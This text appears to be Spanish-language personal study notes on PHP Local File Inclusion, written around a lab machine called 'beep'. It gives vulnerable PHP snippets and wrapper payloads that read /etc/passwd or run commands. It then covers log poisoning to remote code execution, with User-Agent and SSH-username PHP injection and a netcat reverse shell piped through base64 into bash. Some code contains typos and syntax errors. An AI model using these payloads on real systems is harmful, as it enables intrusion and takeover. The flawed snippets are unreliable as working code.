un LFI (Local File Include) vulnabrilidad que se puede ver los archivos desde la web. 

conceptos basicos de un LFI

Ejemplo de codigo de un LFI:
    PHP code:
    =====================
    <?php
        $file = "file.txt";
        include($file);
    ?>
    =====================
    PHP code 2:
    =====================
    <?php
        $file = $_GET['filene'];
        $include($file);
    ?>
    =====================
    PHP code 3:
    =====================
    <?php
        $file = $_GET['filename;];
        include("/var/www/html/" . $file);
    ?>
    =====================

Ejemplos de algunos wrapper a nivel de php
    1. Wrapper:
    =====================
    > url/example.php?filename=file:///etc/passwd
    ======================
    2. Wrapper:
    ======================
    > url/example.php?filename=expect://whoami
    ======================
    3. Wrapper en base 64
    ======================
    > url/example.php?filename=php://filter/convert.base64-encode/resoruce=example.php
    ======================
=========================================================================================================
write up de la maquina beep

1. creacion del directorio de trabajo para la maquina
2. Reconocimiento
3. buscar vuln con searchsploit
4. ver puertos internos
    > /proc/net/tcp
    > cat file.txt | awk '{print $2}' | awk '{print $2}' FS:=":" | sort -u
5. explotacion del LFI

===================================================================================================

Explotacion vulnabrilidad Log Poisoning - LFI to RCE

Para poder explotar esta vuln el atacante tiene que tener capacidad de leer archivos log
Si tenemos permiso de lectura en los logs, hay que mirar el header de la peticion. 
en expecifico los User-Agent. Que es lo que vamos a estar trabajando. 
Que lo que debemos hacer es alterar el contenito que tenga en el User-Agent.

Esto lo podemos hacer atraves de brup o curl
Ejemplo con curl:
'''
> curl "<url>" -H "User-Agent: <?php system('whoami'); ?>"
'''

otro ejemplo con ssh
'''
> ssh '<?php system("whoami"); ?>'@localhost
'''

estabecer una reverse shell con netcat
'''
> echo "nc -e /bin/bash <ip> <port>"
'''

'''
> echo "nc -e /bin/bash <ip> <port>" | base64 -d 
'''

'''
> echo "nc -e /bin/bash <ip> <port>" | base64 -d | bash
'''

reverseshell
'''
> ssh '<?php system("echo <hashEnBase64> | base64 -d | bash"); ?>'@localhost
'''